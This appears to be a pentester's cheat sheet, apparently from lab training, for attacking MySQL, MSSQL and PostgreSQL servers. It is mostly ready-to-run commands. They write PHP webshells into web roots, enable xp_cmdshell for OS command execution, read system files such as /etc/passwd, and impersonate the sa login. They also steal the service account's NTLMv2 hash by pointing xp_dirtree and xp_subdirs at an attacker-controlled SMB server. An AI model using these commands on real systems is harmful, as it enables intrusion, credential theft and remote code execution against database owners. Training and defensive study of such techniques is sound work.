## delete


# MySQL
## Interaction
```bash
$ mysql -u root -h <IP>
$ mysql -u root -pP4SSw0rd -h <IP> -P 3306
```
                      
| Command                                            | Description                                             |
|----------------------------------------------------|---------------------------------------------------------|
| show databases;                                    | Show all databases.                                     |
| use <database>;                                    | Select one of the existing databases.                   |
| show tables;                                       | Show all available tables in the selected database.     |
| show columns from <table>;                         | Show all columns in the selected database.              |
| select * from <table>;                             | Show everything in the desired table.                   |
| select * from <table> where <column> = "<string>"; | Search for the needed string in the desired table.      |


## Footprinting
```bash
$ sudo nmap <IP> -sV -sC -p3306 --script mysql*
```

## Write Local File
```bash
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.

secure_file_priv may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, we can see the secure_file_priv variable is empty, which means we can read and write data using MySQL:

## Read Local Files
```bash
mysql> select LOAD_FILE("/etc/passwd");
```

## Secure File Privileges
```bash
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

* * *

# MSSQL
## Interaction
```bash
$ mysql -u julio -pPassword123 -h <IP>
$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
$ mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>
$ mssqlclient.py <domain>/<user>:<password>@<ip>

$ sqsh -S <IP> -U julio -P 'MyPassword!' -h

> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

| Command                                                   | Description                                           |
|-----------------------------------------------------------|-------------------------------------------------------|
| SELECT name FROM master.dbo.sysdatabases;                 | Show all databases.                                   |
| USE htbusers                                              | Select one of the existing databases.                 |
| SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;   | Show all available tables in the selected database.   |
| SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES |
| SELECT * FROM Employees.dbo.employee_information;         | Show everything in the desired table.                 |

## Footprinting 
## NMAP MSSQL Script Scan
```bash
$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

## MSSQL Ping in Metasploit
```bash
$ msf6 auxiliary(scanner/mssql/mssql_ping)
```

## Enumeration
By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433 port. We can use Nmap's default scripts -sC option to enumerate database services on a target system:

### Banner Grabbing
```
$ nmap -Pn -sV -sC -p1433 10.10.10.125
```

## Execute Commands
- xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing sp_configure
- The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account
- xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed

### XP_CMDSHELL
enable_xp_cmdshell

```
1> xp_cmdshell 'whoami'
2> GO

xp_cmdshell whoami /priv

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

#### Enable XP_CMDSHELL
If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```bash
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

## Write Local Files
To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

### MSSQL - Enable Ole Automation Procedures
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

### Create a File
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read Local Files 
By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

## Capture MSSQL Service Hash
We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:
### XP_DIRTREE Hash Stealing
```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

### XP_SUBDIRS Hash Stealing
```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### XP_SUBDIRS Hash Stealing with Responder
```bash
$ sudo responder -I tun0
```

### XP_SUBDIRS Hash Stealing with impacket
```bash
$ sudo impacket-smbserver share ./ -smb2support
```

## Impersonate Existing Users with MSSQL
### Identify Users that We Can Impersonate
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

### Verifying our Current User and Role
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

### Impersonating the SA User
```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
`Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.`

## Communicate with Other Databases with MSSQL
### Identify linked Servers in MSSQL
```
1> SELECT srvname, isremote FROM sysservers
2> GO
```

```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```
`Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;)`


# POSTGRES
- `psql -h 127.0.0.1 -U postgres` - Connect DB
- `\l` - List all databases
- `\c “db”;` - Select DB
- `\dt;` - List all tables
- `Select * from users;` - Dump table data
